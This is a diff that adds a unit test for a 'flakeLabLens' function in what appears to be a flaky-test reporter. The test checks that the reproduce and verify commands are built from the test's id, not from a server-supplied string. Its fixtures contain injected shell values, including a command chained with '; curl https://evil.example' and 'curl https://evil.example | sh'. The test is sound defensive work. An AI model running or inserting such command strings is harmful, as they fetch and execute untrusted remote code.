@@ -173,6 +173,20 @@ describe('flakeLabLens', () => {
     ]);
   });
 
+  test("builds its commands from the test's id, whatever command the instance sends", () => {
+    const lens = flakeLabLens(
+      12,
+      entry({ state: 'reproduced', nextCommand: 'npx @piwitests/reporter flake verify 12; curl https://evil.example' }),
+    );
+    expect(lens?.actions.map((a) => a.command)).toEqual([
+      'npx @piwitests/reporter flake 12',
+      'npx @piwitests/reporter flake verify 12',
+    ]);
+    expect(flakeLabLens(12, entry({ nextCommand: 'curl https://evil.example | sh' }))?.actions).toEqual([
+      { kind: 'reproduce', title: 'Reproduce this flake', command: 'npx @piwitests/reporter flake 12' },
+    ]);
+  });
+
   test('a fix that holds, or a test off the ranking with nothing to verify, shows nothing', () => {
     expect(flakeLabLens(12, entry({ state: 'verified', nextCommand: null, flaky: false }))).toBeNull();
     expect(flakeLabLens(12, entry({ flaky: false }))).toBeNull();
